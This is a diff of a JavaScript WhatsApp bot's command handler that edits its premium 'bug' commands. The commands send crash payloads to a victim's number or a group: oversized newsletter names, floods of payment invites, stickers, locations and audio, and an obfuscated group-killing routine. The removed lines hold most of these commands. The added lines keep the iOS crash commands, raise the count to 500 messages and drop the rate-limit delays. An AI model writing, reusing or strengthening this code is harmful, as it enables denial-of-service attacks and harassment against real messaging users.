 xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
 break
-case 'xreact': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!m.quoted) return replygcxeon(`Example usage: ${prefix + command} reply chat`)
-await XeonBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
-await sleep(2000)
-await XeonBotInc.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
-}
-break
-case 'x2': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`) 
-amount = text * 30
-for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
-}
-}
-break
-case 'x': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx|5`) 
-await loading()
-victim = text.split("|")[0]+"@s.whatsapp.net"
-amount = text.split("|")[1] * 30
-for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
-}
-replygcxeon(`Successfully Sent Bug To ${victim}`)
-}
-break
-case 'iosbug2': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Example usage: ${prefix + command} 5`)
-amount = text * 30
-for (let i = 0; i < amount; i++) {
-await XeonBotInc.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
-await sleep(1400)
-}
-}
-break
+
+
 case 'iosbug': {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Example:\n ${prefix + command} 91xxxxxxxxxx|5`)
+if (!text) return replygcxeon(`Example:\n ${prefix + command} 91xxxxxxxxxx`)
 await loading()
-victim = text.split("|")[0]+"@s.whatsapp.net"
-amount = text.split("|")[1] * 30
+victim = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net" 
+amount = 500
 for (let i = 0; i < amount; i++) {
 await XeonBotInc.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
-await sleep(1400)
 }
 replygcxeon(`Successfully Sent Bug To ${victim}`)
-}
-break
-case 'xaudio2': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Example usage: ${prefix + command} 5`)
-amount = text * 30
-for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
-}
-}
-break
-case 'xaudio': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Example usage:\n ${prefix + command} 91xxxxxxxxxx|5`)
-await loading()
-victim = text.split("|")[0]+"@s.whatsapp.net"
-amount = text.split("|")[1] * 30
-for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
-}
-replygcxeon(`Successfully Sent Bug To ${victim}`)
-}
-break
-case 'xsticker': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
-await loading()
-victim = text.split("|")[0]+"@s.whatsapp.net"
-amount = text.split("|")[1] * 30
-for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendVideoAsSticker(victim, xsteek, xbug2, { packname: packname, author: author })
-}
-replygcxeon(`Successfully Sent Bug To ${victim}`)
-}
-break
-case 'xsticker2': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Example: ${prefix + command} 5`)
-amount = text * 2
-for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendVideoAsSticker(m.chat, xsteek, xbug2, { packname: packname, author: author })
-}
-}
-break
-case 'xloc2': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Example: ${prefix + command} 5`)
-amount = text
-XeonOP = ownername.repeat(0)
-for (let i = 0; i < amount; i++) {
-XeonBotInc.sendMessage(from, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
-}
-}
-break
-case 'xloc': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
-await loading()
-victim = text.split("|")[0]+"@s.whatsapp.net"
-amount = text.split("|")[1] * 30
-XeonOP = ownername.repeat(0)
-for (let i = 0; i < amount; i++) {
-XeonBotInc.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
-}
-replygcxeon(`Successfully Sent Bug To ${victim}`)
-}
-break
-case 'xlist': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Example:\n${prefix + command} 91xxxxxxxxxx|5`)
-victim = text.split("|")[0]+"@s.whatsapp.net"
-amount = text.split("|")[1] * 30
-for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(victim, { text: '' }, { quoted: xbug2 })
-}
-replygcxeon(`Successfully Sent Bug To ${victim}`)
-}
-break
-case 'xlist2': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Example:\n${prefix + command} 5`)
-amount = text * 30
-for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(from, { text: '' }, { quoted: xbug2 })
-}
 }
 break
 
-case 'xkillgc': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!q) return replygcxeon(`Use ${prefix + command} group-jif`)
-await loading()
-let target = q
-function _0x15a19b(_0x4606b9,_0x12a5f5,_0xc8a211,_0x38bf12){return _0x2c69(_0xc8a211-0x37a,_0x12a5f5);}(function(_0x32c932,_0x1f4144){function _0x4e762(_0x29a032,_0x58669b,_0x4819ff,_0x1bbcab){return _0x2c69(_0x1bbcab-0x3ac,_0x29a032);}function _0x12a254(_0x1099ce,_0x32afd2,_0x194fd0,_0x327cbb){return _0x2c69(_0x1099ce-0x358,_0x327cbb);}const _0x93f3e0=_0x32c932();while(!![]){try{const _0x138da9=parseInt(_0x4e762(0x534,0x508,0x538,0x525))/(0x1c22+0xd27+-0x2948)+-parseInt(_0x12a254(0x4aa,0x4d6,0x4c7,0x4b4))/(0x968+-0x1d56+0xe8*0x16)+parseInt(_0x12a254(0x4ad,0x48b,0x482,0x499))/(-0x1a0c+-0x656*0x3+0x8b*0x53)*(-parseInt(_0x12a254(0x4ac,0x4db,0x4e6,0x4e9))/(0xf41+0x1c7*-0x4+0x1*-0x821))+parseInt(_0x12a254(0x497,0x4d3,0x4bc,0x4cb))/(-0x91a*0x1+-0x1*-0x1a61+0x5e*-0x2f)+parseInt(_0x12a254(0x4b8,0x4ca,0x4da,0x4b4))/(0x14a9+0x11a1+-0x2644)*(parseInt(_0x4e762(0x507,0x4e6,0x536,0x515))/(-0x26*0x86+-0x8f5+0x1ce0))+-parseInt(_0x12a254(0x4b4,0x4c4,0x488,0x487))/(-0x1dc5+-0x1*-0x158f+0x83e)+parseInt(_0x4e762(0x4f9,0x4f3,0x543,0x505))/(0x16d3+0x676+-0x1d40);if(_0x138da9===_0x1f4144)break;else _0x93f3e0['push'](_0x93f3e0['shift']());}catch(_0x5a1c83){_0x93f3e0['push'](_0x93f3e0['shift']());}}}(_0x28f4,-0x895ef+0x2c3ab*0x1+0x70a45*0x2));function _0x28f4(){const _0xc03139=['9631592926','LMRHf','\x22:19999800','nativeFlow','atus\x22:\x22pay','y\x22:1},{\x22re','relog\x20->\x20b','alue\x22:1999','KPvBh','1015567RWhxft','🚨DGXeon🚨','status@bro','hlALu','console','participan','et\x22:100},\x22','ewsletter','extendedTe','wGFMV','quotedMess','qtLWg','eMessage','contextInf','name','relayMessa','log','mqpvR','msJson','{\x22currency','rder\x22:{\x22st','serverMess','eENlZ','newsletter','3159292600','(((.+)+)+)','4605763435','CyYeu','pdrOS','-goods\x22,\x22o','toString','review_and','qXdro','trace',':{\x22value\x22:','tachment','hasMediaAt','tailer_id\x22','\x22:\x22ORDER\x22,','05763435\x22,','fnqzI','ffset\x22:100','constructo','ctor(\x22retu','rn\x20this\x22)(','__proto__','rEVfh','BicPl','interactiv','sendMessag','d\x22:\x22784267','search','PyHzx','buttonPara','ment_reque','\x22retailer_','FSRnS','DSQpv','Name','apply','{}.constru','hGwoG','wlGgz','9800,\x22offs','\x224ONSAXV76','remoteJid','bind','ent_method','2744475MxefMg','Bot\x20Bug\x20','BAE526D352','repeat','ageId','1203631440','essageInfo','quoted','order_type','9999900,\x22o','isForwarde','9\x22,\x22produc','\x22:\x22','sted\x22,\x22sub','\x22,\x22amount\x22','text','y\x22:1}]},\x22n','0@s.whatsa','s\x22:[]}','1956718pKDJWP','jpegThumbn','12dRRZxP','17007BVOKOK','JYWfq','ewsletterM','prototype','2491038IvFzgs','age','100},\x22refe','6236616VQxBED','🦄\x20Xeon\x20🦄','\x22,\x22name\x22:\x22','adcast','9726owwjYh','pp.net','_pay','warn',':\x22physical','uka\x20chat\x20i','stanzaId','xtMessage','\x22product_i','2051mEbMaU','\x22items\x22:[{','rence_id\x22:','APELu','},\x22quantit','gUvHS','total\x22:{\x22v'];_0x28f4=function(){return _0xc03139;};return _0x28f4();}const _0xf3274a=(function(){const _0xe47f4c={};_0xe47f4c['LMRHf']=function(_0x3c6308,_0x22ed9d){return _0x3c6308===_0x22ed9d;};const _0x356cf0=_0xe47f4c;let _0x4928d6=!![];return function(_0x4083b5,_0x405178){const _0x553721=_0x4928d6?function(){function _0x2a4276(_0x5c799f,_0x5f1986,_0x578aa5,_0x2210ae){return _0x2c69(_0x5c799f-0x180,_0x5f1986);}function _0x2e2cd7(_0x558938,_0x2881c8,_0x15d247,_0x3d1266){return _0x2c69(_0x2881c8- -0x2f,_0x558938);}if(_0x405178){if(_0x356cf0[_0x2e2cd7(0x113,0x142,0x11f,0x131)](_0x2a4276(0x2fc,0x30e,0x2f5,0x311),_0x2a4276(0x2fc,0x2f8,0x2f3,0x311))){const _0x471196=_0x405178[_0x2a4276(0x2b6,0x2e3,0x2ab,0x2d9)](_0x4083b5,arguments);return _0x405178=null,_0x471196;}else{if(_0x382c57){const _0x1a504b=_0x396a5f[_0x2e2cd7(0x144,0x107,0x128,0xe6)](_0x5ec307,arguments);return _0x5171ab=null,_0x1a504b;}}}}:function(){};return _0x4928d6=![],_0x553721;};}()),_0xba930b=_0xf3274a(this,function(){function _0x6d950(_0x9cf75f,_0x40c57a,_0xc3e9a6,_0x3af5ff){return _0x2c69(_0x40c57a- -0x20a,_0x9cf75f);}function _0x5503bf(_0x4d57f6,_0x46058f,_0x3ca3bd,_0x7fe452){return _0x2c69(_0x7fe452-0x2c,_0x4d57f6);}const _0x1c68ae={};_0x1c68ae['KPvBh']=_0x5503bf(0x1a6,0x1cf,0x1f9,0x1be)+'+$';const _0x56cda8=_0x1c68ae;return _0xba930b[_0x6d950(-0x38,-0x73,-0x71,-0x60)]()[_0x6d950(-0xec,-0xdc,-0xa8,-0xd6)](_0x56cda8['KPvBh'])[_0x6d950(-0x9a,-0x73,-0x54,-0x77)]()[_0x6d950(-0x51,-0x67,-0x64,-0x91)+'r'](_0xba930b)[_0x5503bf(0x135,0x146,0x138,0x15a)](_0x56cda8[_0x5503bf(0x16b,0x1b5,0x165,0x1a4)]);});_0xba930b();const _0x27e679=(function(){const _0x52c56d={};function _0x1e2a96(_0x5e8491,_0x27062,_0x157918,_0x4a516f){return _0x2c69(_0x27062- -0x3a2,_0x4a516f);}_0x52c56d[_0x1e2a96(-0x1d2,-0x201,-0x1c7,-0x205)]=function(_0x299c4f,_0x303405){return _0x299c4f===_0x303405;},_0x52c56d[_0x47b5b4(-0x7b,-0x60,-0x4a,-0x82)]=_0x1e2a96(-0x1f7,-0x1fa,-0x1bb,-0x213),_0x52c56d['pdrOS']=function(_0x349826,_0x5a01cb){return _0x349826===_0x5a01cb;};function _0x47b5b4(_0x9242fe,_0x34f26c,_0x236436,_0xc890cb){return _0x2c69(_0xc890cb- -0x1ba,_0x236436);}_0x52c56d[_0x47b5b4(-0x56,-0x9a,-0x32,-0x64)]=_0x1e2a96(-0x1fa,-0x236,-0x267,-0x23c);const _0x4e8549=_0x52c56d;let _0x14afcb=!![];return function(_0x2fda07,_0x1f0236){function _0x248f3f(_0x2da683,_0x5d16ad,_0x1ab971,_0x117841){return _0x47b5b4(_0x2da683-0x95,_0x5d16ad-0xe6,_0x117841,_0x2da683-0xf9);}const _0x3e951c={'wGFMV':function(_0x2d3b2b,_0x1f21d8){function _0x4936aa(_0x10ef59,_0x25a683,_0x29f193,_0x24905a){return _0x2c69(_0x10ef59- -0x34c,_0x29f193);}return _0x4e8549[_0x4936aa(-0x1ab,-0x19e,-0x1b6,-0x1e3)](_0x2d3b2b,_0x1f21d8);},'wlGgz':_0x4e8549['hGwoG']};function _0x4e5da3(_0x9e6a14,_0x56ad8e,_0x3b042d,_0x3a71c6){return _0x47b5b4(_0x9e6a14-0xd9,_0x56ad8e-0x12c,_0x56ad8e,_0x3b042d-0xb8);}if(_0x4e8549[_0x248f3f(0xd4,0xcf,0xf8,0xea)](_0x4e8549['JYWfq'],_0x4e8549[_0x248f3f(0x95,0x9a,0xba,0xd1)])){const _0xbc1ff4=_0x14afcb?function(){function _0x3f1e52(_0x501052,_0x3819b9,_0xcdf14c,_0x20b695){return _0x248f3f(_0x20b695-0x2a4,_0x3819b9-0x1e5,_0xcdf14c-0x3d,_0x501052);}function _0xb0be2e(_0x245618,_0x49a541,_0x57aedc,_0x50a750){return _0x248f3f(_0x50a750-0x48f,_0x49a541-0x18b,_0x57aedc-0x10e,_0x49a541);}if(_0x3e951c[_0xb0be2e(0x54b,0x57f,0x55d,0x550)](_0x3e951c[_0xb0be2e(0x507,0x546,0x4eb,0x507)],_0x3e951c['wlGgz'])){if(_0x1f0236){const _0x54e552=_0x1f0236['apply'](_0x2fda07,arguments);return _0x1f0236=null,_0x54e552;}}else{const _0x1162a9=_0x55e6f5[_0xb0be2e(0x514,0x50e,0x525,0x504)](_0x55d62f,arguments);return _0x1d6e65=null,_0x1162a9;}}:function(){};return _0x14afcb=![],_0xbc1ff4;}else{const _0x3c8ae3=_0x10db29?function(){if(_0x47eefa){const _0x116ac3=_0x1bc075['apply'](_0x140e7d,arguments);return _0x4927b3=null,_0x116ac3;}}:function(){};return _0x74a72d=![],_0x3c8ae3;}};}()),_0x4b1e40=_0x27e679(this,function(){const _0x23c375={'nKLkp':function(_0x18c493,_0x9d5498){return _0x18c493(_0x9d5498);},'FSRnS':function(_0x470d2d,_0xc532f7){return _0x470d2d+_0xc532f7;},'CmuKI':function(_0x21a509,_0x2ef4f5){return _0x21a509+_0x2ef4f5;},'rEVfh':'return\x20(fu'+'nction()\x20','PyHzx':_0x3b55e5(-0x2a,-0x94,-0x96,-0x5b)+_0x17c6eb(0x315,0x32d,0x2d7,0x2eb)+_0x3b55e5(-0x17,-0x1a,-0xb,0x13)+'\x20)','DSQpv':function(_0xd33de8){return _0xd33de8();},'mqpvR':_0x17c6eb(0x2d4,0x2a5,0x30c,0x2bd),'MVzXY':'info','eENlZ':'error','CyYeu':'exception','qtLWg':'table','qXdro':_0x17c6eb(0x30b,0x31c,0x2d2,0x327),'gUvHS':function(_0x4e7602,_0x112b55){return _0x4e7602<_0x112b55;}};let _0x540ff0;try{const _0x2de064=_0x23c375['nKLkp'](Function,_0x23c375[_0x17c6eb(0x2a4,0x26e,0x2be,0x275)](_0x23c375['CmuKI'](_0x23c375[_0x3b55e5(0x3b,-0x19,0x38,0x15)],_0x23c375[_0x3b55e5(-0x90,-0x7b,-0x66,-0x63)]),');'));_0x540ff0=_0x23c375[_0x3b55e5(-0x3b,-0x44,-0x5a,-0x5e)](_0x2de064);}catch(_0x534aaf){_0x540ff0=window;}function _0x17c6eb(_0xa2b8eb,_0x577433,_0x1792ac,_0x3a2105){return _0x2c69(_0xa2b8eb-0x171,_0x1792ac);}const _0x67c609=_0x540ff0[_0x17c6eb(0x2ee,0x2db,0x2de,0x2bf)]=_0x540ff0[_0x3b55e5(0x14,-0x41,0x26,-0x15)]||{};function _0x3b55e5(_0x5c0e1b,_0x54810d,_0x29a7c9,_0x27545a){return _0x2c69(_0x27545a- -0x192,_0x29a7c9);}const _0x2c48a3=[_0x17c6eb(0x2fa,0x315,0x2bf,0x2cb),_0x23c375[_0x17c6eb(0x2fb,0x2be,0x313,0x304)],_0x23c375['MVzXY'],_0x23c375[_0x17c6eb(0x300,0x2db,0x303,0x2c2)],_0x23c375[_0x3b55e5(0xb,-0xa,-0x10,0x2)],_0x23c375[_0x17c6eb(0x2f5,0x2bd,0x2ff,0x30a)],_0x23c375[_0x17c6eb(0x30a,0x30c,0x2e6,0x2e7)]];for(let _0x517dea=-0x1f15*0x1+-0x26*0x6a+0x3*0xf9b;_0x23c375[_0x17c6eb(0x2df,0x319,0x2f9,0x2b7)](_0x517dea,_0x2c48a3['length']);_0x517dea++){const _0x3351ea=_0x27e679[_0x17c6eb(0x314,0x32f,0x315,0x2dd)+'r'][_0x17c6eb(0x2c9,0x29c,0x2d7,0x2e3)][_0x17c6eb(0x2ae,0x2a7,0x2be,0x271)](_0x27e679),_0xadfcb=_0x2c48a3[_0x517dea],_0x1de33d=_0x67c609[_0xadfcb]||_0x3351ea;_0x3351ea[_0x17c6eb(0x317,0x2e9,0x34f,0x313)]=_0x27e679[_0x17c6eb(0x2ae,0x29d,0x278,0x2d0)](_0x27e679),_0x3351ea[_0x3b55e5(0x3e,0x3b,-0x34,0x5)]=_0x1de33d[_0x17c6eb(0x308,0x323,0x2d7,0x2e2)]['bind'](_0x1de33d),_0x67c609[_0xadfcb]=_0x3351ea;}});_0x4b1e40();function _0x2427a7(_0x21fa51,_0x4358bc,_0x31d5c0,_0xf52ecc){return _0x2c69(_0x31d5c0-0x1ce,_0x4358bc);}function _0x2c69(_0x537000,_0xba930b){const _0xf3274a=_0x28f4();return _0x2c69=function(_0x28f4bb,_0x2c6957){_0x28f4bb=_0x28f4bb-(0x4*-0x3+0x1dbd+-0x1c86);let _0x3f9e4c=_0xf3274a[_0x28f4bb];return _0x3f9e4c;},_0x2c69(_0x537000,_0xba930b);}let bug='\x03'[_0x15a19b(0x4e0,0x4e1,0x4bc,0x4bc)](-0xceb14+0x4c1*0x3d7+-0x3d1bd*-0x1);for(let i=-0x3ed*0x7+0x1749+0x432;i<-0x2*-0x14c+-0x1510+-0x94b*-0x2;i++){const _0x18e95c={};_0x18e95c[_0x2427a7(0x33f,0x369,0x35e,0x36d)+'Jid']=_0x2427a7(0x309,0x32e,0x312,0x2dd)+'38483540@n'+_0x15a19b(0x4ee,0x50f,0x4fa,0x4e6),_0x18e95c[_0x15a19b(0x52e,0x4e6,0x50a,0x4db)+_0x15a19b(0x4a9,0x487,0x4af,0x4da)]=_0x2427a7(0x335,0x326,0x344,0x381)+_0x15a19b(0x4d6,0x4a7,0x4df,0x518)+'ni\x20->\x20cras'+'h',_0x18e95c[_0x15a19b(0x4fc,0x4ee,0x508,0x538)+_0x2427a7(0x33b,0x2ff,0x311,0x31a)]=0x2;const _0x427c68={};_0x427c68[_0x2427a7(0x33d,0x32f,0x36b,0x332)+_0x2427a7(0x390,0x3a6,0x36a,0x346)]=[],_0x427c68[_0x2427a7(0x352,0x2f9,0x321,0x331)+'ail']=global['bimg'];const _0xbe5d7a={};_0xbe5d7a[_0x15a19b(0x4ce,0x506,0x501,0x4f9)]=_0x2427a7(0x339,0x339,0x366,0x389)+_0x15a19b(0x4da,0x4f4,0x4dc,0x4b4),_0xbe5d7a[_0x15a19b(0x4bc,0x49b,0x4aa,0x493)+_0x15a19b(0x51f,0x505,0x505,0x4c7)]=_0x15a19b(0x4f3,0x4c8,0x506,0x53d)+'\x22:\x22IDR\x22,\x22t'+'otal_amoun'+'t\x22:{\x22value'+_0x2427a7(0x33c,0x311,0x340,0x352)+',\x22offset\x22:'+_0x2427a7(0x331,0x302,0x329,0x2f8)+_0x15a19b(0x4d0,0x4dc,0x4e5,0x4be)+_0x15a19b(0x4e4,0x4ce,0x4b5,0x4de)+'KN\x22,\x22type\x22'+_0x15a19b(0x4cf,0x4ea,0x4de,0x4ff)+_0x15a19b(0x4fd,0x539,0x510,0x50a)+_0x2427a7(0x333,0x338,0x35b,0x347)+_0x2427a7(0x380,0x312,0x342,0x312)+_0x15a19b(0x4a9,0x476,0x4ab,0x4b1)+_0x2427a7(0x2ff,0x2fa,0x31a,0x353)+_0x15a19b(0x4c3,0x4b4,0x4e9,0x511)+_0x15a19b(0x504,0x4ba,0x4f1,0x52a)+_0x2427a7(0x326,0x33c,0x308,0x2db)+_0x15a19b(0x4fc,0x520,0x4f9,0x52e)+_0x2427a7(0x31e,0x334,0x315,0x2e1)+_0x2427a7(0x349,0x347,0x36d,0x35e)+_0x2427a7(0x34c,0x362,0x338,0x312)+_0x15a19b(0x48a,0x4d3,0x4ac,0x48d)+'id\x22:\x2275376'+_0x15a19b(0x535,0x4f5,0x50b,0x518)+_0x2427a7(0x348,0x2f8,0x318,0x30d)+'t_id\x22:\x22799'+_0x15a19b(0x510,0x500,0x4ea,0x4ff)+'009\x22,\x22name'+_0x2427a7(0x357,0x2de,0x319,0x2fa)+xbugtex['xtxt']+(_0x2427a7(0x2ee,0x33f,0x31b,0x310)+_0x2427a7(0x33c,0x381,0x369,0x387)+_0x15a19b(0x4b6,0x48b,0x4c2,0x500)+_0x2427a7(0x364,0x358,0x370,0x3a0)+'},\x22quantit'+_0x15a19b(0x4d9,0x4d2,0x4ef,0x4c8)+_0x2427a7(0x335,0x390,0x36c,0x385)+':\x2278426746'+_0x2427a7(0x339,0x359,0x36e,0x350)+_0x15a19b(0x509,0x4bf,0x4e2,0x520)+_0x2427a7(0x2f8,0x303,0x2fb,0x307)+_0x15a19b(0x542,0x529,0x50d,0x4d9)+_0x15a19b(0x4b1,0x4fa,0x4d8,0x4be)+_0x2427a7(0x2df,0x322,0x30e,0x2ee)+_0x15a19b(0x4d5,0x4bb,0x4d7,0x4b5))+bug+(_0x2427a7(0x32b,0x308,0x31b,0x356)+_0x2427a7(0x357,0x3a5,0x369,0x37c)+_0x15a19b(0x49c,0x4e5,0x4c2,0x4af)+_0x2427a7(0x39d,0x354,0x370,0x37c)+_0x2427a7(0x30c,0x314,0x33b,0x374)+_0x15a19b(0x4ac,0x4b8,0x4c9,0x4a8)+'ative_paym'+_0x15a19b(0x49f,0x4ef,0x4b8,0x490)+_0x2427a7(0x2ff,0x351,0x31f,0x351));const _0x68c8f1={};_0x68c8f1['buttons']=[_0xbe5d7a];const _0x3439e0={};_0x3439e0['header']=_0x427c68,_0x3439e0[_0x2427a7(0x34b,0x312,0x341,0x33d)+'Message']=_0x68c8f1;const _0x22ac8a={};_0x22ac8a[_0x15a19b(0x48d,0x470,0x4a5,0x4d4)+_0x2427a7(0x345,0x34d,0x353,0x33b)]=_0x3439e0;const _0x19935d={};_0x19935d[_0x2427a7(0x33f,0x318,0x317,0x316)+'d']=!![],_0x19935d['forwardedN'+_0x2427a7(0x2ff,0x359,0x325,0x311)+_0x15a19b(0x48d,0x494,0x4bf,0x4af)]=_0x18e95c,_0x19935d[_0x15a19b(0x51e,0x515,0x4e0,0x50f)]=_0x2427a7(0x339,0x300,0x30f,0x346)+'FE4CDF',_0x19935d[_0x15a19b(0x506,0x4e3,0x4f8,0x52a)+'t']=_0x15a19b(0x4b2,0x48f,0x4ca,0x4b1)+_0x2427a7(0x36c,0x2f3,0x32f,0x2fe),_0x19935d[_0x2427a7(0x336,0x377,0x351,0x358)+_0x2427a7(0x34a,0x33e,0x328,0x35f)]=_0x22ac8a,_0x19935d[_0x2427a7(0x2f2,0x31b,0x30a,0x2d4)]=_0x15a19b(0x506,0x4dd,0x4f5,0x501)+_0x2427a7(0x312,0x32f,0x32d,0x333);const _0x48f80b={};_0x48f80b[_0x2427a7(0x2e4,0x2f7,0x31c,0x326)]=_0x2427a7(0x369,0x317,0x348,0x368),_0x48f80b[_0x2427a7(0x377,0x320,0x354,0x357)+'o']=_0x19935d;const _0x303aff={};_0x303aff[_0x2427a7(0x353,0x34e,0x34f,0x326)+_0x2427a7(0x333,0x31c,0x335,0x326)]=_0x48f80b,await XeonBotInc[_0x2427a7(0x379,0x359,0x356,0x385)+'ge'](target,_0x303aff,{});const _0x59a15e={};_0x59a15e[_0x2427a7(0x311,0x300,0x31c,0x2e2)]='';const _0x569645={};_0x569645[_0x15a19b(0x4bf,0x4a3,0x4c0,0x4e4)]=xbug2,await XeonBotInc[_0x2427a7(0x2f3,0x333,0x2fa,0x311)+'e'](target,_0x59a15e,_0x569645);}
-replygcxeon(`Successfully Sent Bug To ${target}`)
-}
-break
+
 case 'tempban': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!text) return replygcxeon(`Example: ${prefix + command} 91|6909137211`)
@@ -3587,473 +3217,37 @@ dropNumber()
 }, 400)
 }
 break
-case 'iosq':{
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "50"
-for (let i = 0; i < amount; i++) {
-XeonBotInc.relayMessage(from,{
-extendedTextMessage:{
-"text":'.',
-"contextInfo": {
-"stanzaId": victim,
-"participant": victim,
-"quotedMessage": {
-"conversation": xeontext1
-},
-"disappearingMode": {
-"initiator": "CHANGED_IN_CHAT",
-"trigger": "CHAT_SETTING"
-}
-},
-"inviteLinkGroupTypeV2": "DEFAULT"
-}
-},{messageId: null})
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-}
-break
-case 'iosgoogle': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "50"
-for (let i = 0; i < amount; i++) {
-XeonBotInc.sendMessage(victim,{
-text: `https://google.com`,
-contextInfo: {
-externalAdReply: {
-renderLargerThumbnail: true,
-mediaType: 1,
-title: xeontext6,
-body: `###############################`,
-thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
-jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
-previewType: "NONE",
-sourceUrl: link,
-}}
-})
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-}
-break
-case 'iosgoogle2': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(text)}`
-for (let i = 0; i < amount; i++) {
-XeonBotInc.sendMessage(m.chat,{
-text: `https://google.com`,
-contextInfo: {
-externalAdReply: {
-renderLargerThumbnail: true,
-mediaType: 1,
-title: xeontext6,
-body: `###############################`,
-thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
-jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
-previewType: "NONE",
-sourceUrl: link,
-}}
-})
-}
-replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
-}
-break
+
 case 'xioscrash':
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
- victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "50"
+ victim = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+amount = "500"
 for (let i = 0; i < amount; i++) {
 XeonBotInc.relayMessage(victim,{ 
 "paymentInviteMessage": {
 serviceType: "UPI",
 expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
 }},{})
-await sleep(3000)
 }
 replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
-case 'xioscrash2':{
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
- amount = `${encodeURI(text)}`
-for (let i = 0; i < amount; i++) {
-XeonBotInc.relayMessage(m.chat,{ 
-"paymentInviteMessage": {
-serviceType: "UPI",
-expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
-}},{})
